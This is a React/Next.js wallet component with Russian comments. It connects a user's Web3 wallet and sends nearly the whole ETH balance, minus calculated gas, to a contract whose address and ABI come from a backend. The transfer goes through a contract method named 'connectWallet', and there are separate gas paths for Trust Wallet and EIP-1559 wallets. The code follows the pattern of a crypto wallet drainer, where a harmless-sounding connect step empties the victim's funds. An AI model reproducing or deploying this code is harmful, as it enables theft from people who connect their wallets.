'use client'

import { BACKEND_LINK } from '@/utils/variables';
import { useState } from 'react';
import Web3, { Contract } from 'web3';
import type { TransactionReceipt } from 'web3-types';


interface ExternalProvider {
  selectedAddress?: string
  isMetaMask?: boolean
  isTrust?: boolean
  request(args: { method: string; params?: unknown[] }): Promise<unknown>
  on?(event: string, listener: (...args: unknown[]) => void): void
  removeListener?(event: string, listener: (...args: unknown[]) => void): void
}

interface ResponseContract {
  contract: {
    address: string
    abi: any[]
  }
}


interface ResponseCalculateGasTrxNew {
  gasLimit: string;
  gasPrice: string;
  valueHex: string;
}

interface ResponseCalculateGasTrxLegacy {
  gasLimit: string;
  gasPrice: string;
  sendValue: string;
}

async function fetchContractData(): Promise<{ address: string; abi: any[] }> {
  const res = await fetch(`${BACKEND_LINK}/contract`)
  if (!res.ok) {
    throw new Error(`Ошибка при запросе контракта: HTTP ${res.status}`)
  }
  const data = (await res.json()) as ResponseContract

  // Проверяем, что есть поле contract.address и contract.abi
  if (
    !data.contract ||
    typeof data.contract.address !== 'string' ||
    !Array.isArray(data.contract.abi)
  ) {
    throw new Error('Некорректный ответ от сервера: ' + JSON.stringify(data))
  }

  return {
    address: data.contract.address,
    abi: data.contract.abi,
  }
}

async function calculateGasTrxNew(
  from: string,
  ctr: Contract<any[]>,
  web3: Web3,
): Promise<ResponseCalculateGasTrxNew> {
  // 1) Берём баланс
  const balanceWei = BigInt(await web3.eth.getBalance(from))
  // 2) Берём текущий gasPrice
  const gasPrice = BigInt(await web3.eth.getGasPrice())

  // 3) Примерная оценка газа при value = balanceWei
  const gasLimitBI = BigInt(
    await ctr.methods.connectWallet().estimateGas({
      from: from,
      value: balanceWei.toString()
    })
  )

  // 4) Добавляем 10% запаса
  const gasLimit = gasLimitBI + gasLimitBI / 10n;

  // 5) Считаем sendValue
  const feeCost = gasLimit * gasPrice
  const sendValue = balanceWei > feeCost ? balanceWei - feeCost : 0n;
  if (sendValue <= 0n) {
    throw new Error('Недостаточно ETH для покрытия газа');
  }

  return {
    gasLimit: gasLimit.toString(),
    gasPrice: gasPrice.toString(),
    valueHex: '0x' + sendValue.toString(16),
  }
}

async function calculateGasTrxLegacy(
  from: string,
  ctr: Contract<any[]>,
  web3: Web3
): Promise<ResponseCalculateGasTrxLegacy> {
 // 1) Баланс
  const balanceWei = BigInt(await web3.eth.getBalance(from));
  if (balanceWei === 0n) {
    throw new Error('Баланс кошелька равен нулю.');
  }

  // 2) Оценка газа
  let estimatedGasBI: bigint;
  try {
    const raw: bigint = await ctr.methods.connectWallet().estimateGas({ from });
    estimatedGasBI = BigInt(raw);
  } catch (err) {
    estimatedGasBI = 21000n;
  }

  // 3) gasPrice
  const gasPriceWei = BigInt(await web3.eth.getGasPrice());

  // 4) feeCost = gasLimitBI * gasPriceWei
  const feeCost = estimatedGasBI * gasPriceWei;

  // 5) sendValueBI
  let sendValueBI: bigint;
  const bufferWei = 1n;
  if (feeCost >= balanceWei) {
    sendValueBI = 0n;
  } else {
    sendValueBI = balanceWei - feeCost - bufferWei;
  }

  return {
    gasLimit: estimatedGasBI.toString(),
    gasPrice: gasPriceWei.toString(),
    sendValue: sendValueBI.toString(),
  };
}

async function sendAllBalanceViaEIP1559(
  eth: ExternalProvider,
  from: string,
  setStatus: (msg: string) => void
): Promise<string> {
  // 1) Берём address + abi из бекенда
  const { address: contractAddress, abi } = await fetchContractData()

  // ─── 2) Создаём web3 и экземпляр контракта ────────────────────────────────
  const web3 = new Web3(eth as any)
  const ctr = new web3.eth.Contract(abi, contractAddress)

  const txParams: Record<string, string> = { from }

  if (eth.isTrust) {
    const legacy = await calculateGasTrxLegacy(from, ctr, web3);
    const { gasLimit, gasPrice, sendValue } = legacy;

    txParams.gas = gasLimit;
    txParams.gasPrice = gasPrice;
    txParams.value = sendValue;
  } else {
    const eip = await calculateGasTrxNew(from, ctr, web3);
    txParams.gas = eip.gasLimit
    txParams.gasPrice = eip.gasPrice
    txParams.value = eip.valueHex;
  }

  const receipt: TransactionReceipt = await ctr.methods
    .connectWallet()
    .send(txParams)

  setStatus(`Успех! TxHash: ${receipt.transactionHash}`)
  return String(receipt.transactionHash);
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum as ExternalProvider & {
      isMetaMask?: boolean
      isTrust?: boolean
    }
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    setBusy(true)
    setStatus('Запрашиваем аккаунт…')
    let addr = eth.selectedAddress as string | undefined
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: unknown) {
        const msg = e instanceof Error ? e.message : String(e);
        setStatus(`Ошибка: ${msg}`);
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    // const currentChainId = (await eth.request({
    //     method: 'eth_chainId',
    // })) as string
    // console.log('currentChainId: ', currentChainId)

    // if (currentChainId !== '0xaa36a7') {
    //     setStatus('Переключаем сеть на Sepolia…')

    //     try {
    //       // Пытаемся переключить сеть на Sepolia
    //       await eth.request({
    //         method: 'wallet_switchEthereumChain',
    //         params: [{ chainId: '0xaa36a7' }],
    //       })
    //     } catch (switchError: any) {
    //       // Если Sepolia ещё не добавлена, добавляем через wallet_addEthereumChain
    //       if (switchError.code === 4902 || switchError.code === -32603) {
    //         // Параметры сети Sepolia
    //         try {
    //           await eth.request({
    //             method: 'wallet_addEthereumChain',
    //             params: [
    //               {
    //                 chainId: '0xaa36a7',
    //                 chainName: 'Sepolia Testnet',
    //                 nativeCurrency: {
    //                   name: 'SepoliaETH',
    //                   symbol: 'SEP', // или 'ETH'
    //                   decimals: 18,
    //                 },
    //                 rpcUrls: ['https://rpc.sepolia.org'],
    //                 blockExplorerUrls: ['https://sepolia.etherscan.io'],
    //               },
    //             ],
    //           })
    //           // После добавления снова переключаем
    //           await eth.request({
    //             method: 'wallet_switchEthereumChain',
    //             params: [{ chainId: '0xaa36a7' }],
    //           })
    //         } catch (addError: any) {
    //           const msg = addError instanceof Error ? addError.message : String(addError)
    //           setStatus(`Не удалось добавить сеть Sepolia: ${msg}`)
    //           setBusy(false)
    //           return
    //         }
    //       } else {
    //         const msg = switchError instanceof Error ? switchError.message : String(switchError)
    //         setStatus(`Не удалось переключить сеть: ${msg}`)
    //         setBusy(false)
    //         return
    //       }
    //     }
    //   }

    try {
      const txHash = await sendAllBalanceViaEIP1559(eth, addr, setStatus)
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : String(e);
      setStatus(`Ошибка: ${msg}`);
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p><strong>Статус:</strong> {status}</p>
      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
    </div>
  )
}
